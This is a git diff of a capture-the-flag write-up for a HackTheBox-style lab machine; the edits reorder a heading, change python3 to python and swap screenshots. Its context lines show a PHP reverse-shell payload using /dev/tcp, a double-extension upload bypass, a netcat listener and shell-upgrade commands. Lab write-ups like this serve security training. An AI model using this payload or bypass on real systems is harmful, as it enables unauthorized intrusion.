@@ -60,6 +60,8 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a8475de9-9279-40ed-9af0-2ed8d1f9653c)
 
+
+## Gaining Access
 + Create a reverse shell **.php** file as **shell.php**, and then add one more extension as **.png** after **.php**. 
 ```
 <?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1'"); ?>
@@ -76,24 +78,17 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 + Start netcat listener on the attack machine: `nc -lnvp 4444`
 + Go to the **http://10.10.10.146/photos.php** that is discovered on the first directory fuzzing.
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/36e12878-5cd2-4abb-93e2-ecdbfaf2dfb6)
-
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/938b2b01-5334-437a-8769-5de7d1585d15)
-
 
 + Get low level shell, and see the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
 
-
-
-
-## Gaining Access
-
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7e030c55-ccc1-4d2d-987e-aae574a007fb)
 
 
 ### Shell Upgrade
 + We have partially interactive bash shell. Upgrade it to get a fully interactive shell, do more stable with a better shell.
 ```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
 script /dev/null -c bash
 CTRL^Z: Ctrl + Z
 stty raw -echo; fg
@@ -103,6 +98,9 @@ export TERM=xterm
 export SHELL=bash
 stty rows 55 columns 285
 ```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a949dd60-e50c-4d98-8c1b-93ff60a0657c)
+
 
 
 ## Privilege Escalation
